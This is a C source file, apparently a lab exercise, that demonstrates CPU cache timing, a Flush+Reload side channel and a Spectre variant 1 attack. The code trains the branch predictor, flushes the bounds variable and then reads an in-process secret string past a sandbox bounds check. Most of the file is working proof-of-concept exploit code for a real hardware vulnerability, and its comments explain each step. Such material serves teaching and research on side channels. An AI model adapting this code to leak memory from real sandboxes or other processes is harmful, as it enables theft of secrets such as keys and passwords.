#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <emmintrin.h>
#include <x86intrin.h> /* for rdtscp and clflush */

/* CACHE LINE PARAMETER */
#define LINE_SIZE   64

#define L1_WAYS     8
#define L1_SETS     64
#define L1_LINES    512

/* get the time of read addr from cache line(cache hit)
 * and the time cache miss */

int do_clflush(int flush)
{
//	unsigned long *m8;
	int *addr;
	int data;
	int content[512];

	printf("=============FLUSH:%d============\n", flush);
	addr = content;
	//load centent into cache
	content[8] = 8;

	printf("addr addr:%p, *addr:0x%x, *(addr+1):0x%x\n",
		addr, *addr, *(addr+1));
	if( flush == 1){
			for(int i = 0; i < 512; i = i + 64)
			_mm_clflush(addr + i);
	}
	register uint64_t t1, t2;
	for (int i = 0; i < 512; i = i + 32) {
			t1 = __rdtscp(&data);
			addr = content + i;
			data = *addr;
			t2 = __rdtscp(&data) - t1;
			printf("i = %2d, cycles: %ld\n", i, t2);
  }
	
	return 0;
}

////////////////////////////////////////////////////////////////
//uint8_t array[10*4096];
uint8_t array[256*4096];
int cache_time(void) {
		int junk=0;
		register uint64_t time1, time2;
		volatile uint8_t *addr;
		int i;
		// Initialize the array
		for(i=0; i<10; i++) array[i*4096]=1;
		// FLUSH the array from the CPU cache
		for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
		// Access some of the array items
		array[3*4096] = 100;
		array[7*4096] = 200;

		for(i=0; i<10; i++) {
				addr = &array[i*4096];
				time1 = __rdtscp(&junk);
				junk = *addr;
				time2 = __rdtscp(&junk) - time1;
				printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
		}
		return 0;
}

///////////////////////////////////////////////////////////////
/* flush + reload */
int temp;
char secret = 94;
/*  cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (150)
#define DELTA 1024
void flushSideChannel()
{
		int i;
		// Write to array to bring it to RAM to prevent Copy-on-write
		for (i = 0; i < 256; i++) 
				array[i*4096 + DELTA] = 1;

		//Flush the values of the array from cache
		for (i = 0; i < 256; i++) 
				_mm_clflush(&array[i*4096 +DELTA]);
}

void victim()
{
		temp = array[secret*4096 + DELTA];
}


void reloadSideChannel()
{
		int junk=0;
		register uint64_t time1, time2;
		volatile uint8_t *addr;
		int i;
		for(i = 0; i < 256; i++){
				addr = &array[i*4096 + DELTA];
				time1 = __rdtscp(&junk);
				junk = *addr;
				time2 = __rdtscp(&junk) - time1;
				//printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
				if (time2 <= CACHE_HIT_THRESHOLD){
						printf("array[%d*4096 + %d] is in cache.(TIME:%ld)\n", i, DELTA, time2);
						printf("The Secret = %d.\n",i);
				}
		}
		return;
}


int flush_Reload(void)
{
		printf("####################%s####################\n", __FUNCTION__);
		flushSideChannel();
		victim();
		reloadSideChannel();
		printf("#################OVER %s##################\n", __FUNCTION__);
		return (0);
}


size_t  size = 10;


void victim_Spectre(size_t x)
{

		if(x < size){
				//int i = 0;
				//i = temp + 100;
				//printf("====%ld %ld====\n", x, size);
				temp = array[x * 4096 + DELTA];
				printf("====%ld %ld====\n", x, size);
		}
		else{
				temp = array[(x + 15) * 4096 + DELTA];
		}
}

int spectre_Experiment(void)
{
		int i = 0;
		printf("####################%s####################\n", __FUNCTION__);
		// FLUSH the probing array
		flushSideChannel();
		// Train the CPU to take the true branch inside victim()
		// 这里通过训练，让cpu保存下这个结果，这个结果会被CPU后面用作预测执行，先让他认为以后的预测都是true
		// 这样以后cpu就会想当然的认为下次自选的条件还是true，先按照true来预执行，从而将部分语句先执行掉。
		for(i = 0; i < 10; i++) {
				//_mm_clflush(&size);
				victim_Spectre(i);
		}

		// Exploit the out-of-order execution
		_mm_clflush(&size);
		for(i = 0; i < 256; i++) {
				_mm_clflush(&array[ i * 4096 + DELTA ]);
		}
		victim_Spectre(97);
		//

		// reload the probing array
		reloadSideChannel();
		printf("#################OVER %s##################\n", __FUNCTION__);
		return (0);
}


/////////////////////////////////////////////////////////////
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t temp_s = 0;
uint8_t temp_1 = 0;
uint8_t temp_2 = 0;
uint8_t temp3 = 0;
uint8_t temp_4 = 0;
char *secret_s = "Some Secret Value";
uint8_t array_s[256*4096];
// Sandbox Function
uint8_t restrictedAccess(size_t x){

		if (x < buffer_size) {
				return buffer[x];
		} else {
				return 0;
		}
}

void spectreAttack(size_t larger_x)
{
		int i;
		uint8_t s;
		//Train the CPU to take the true branch inside restrictedAccess().
		for (i = 0; i < 10; i++) 
		{ 
				restrictedAccess(i); 
		}
		// Flush buffer_size and array[] from the cache.
		_mm_clflush(&buffer_size);
		for (i = 0; i < 256; i++) 
		{ 
				_mm_clflush(&array[i*4096 + DELTA]); 
		}
		// Ask restrictedAccess() to return the secret in out-of-order execution.

		s = restrictedAccess(larger_x);

		//printf("====%d \n", s);
		array[s*4096 + DELTA] += 88;
}




int spectre_attack(void)
{
		int i = 0;
		printf("####################%s####################\n", __FUNCTION__);
		// FLUSH the probing array
		flushSideChannel();
		size_t larger_x = (size_t)(secret_s - (char *)buffer);
		printf("Trying  %p\n", (void *)larger_x);

		spectreAttack(larger_x+1);

		// reload the probing array
		reloadSideChannel();
		printf("#################OVER %s##################\n", __FUNCTION__);
		return (0);
}


/////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////


int main(void)
{
  spectre_attack();
  //spectre_Experiment();
  //cache_time();
	//flush_Reload();
	//do_clflush(0);
	//do_clflush(1);

	return 0;
}
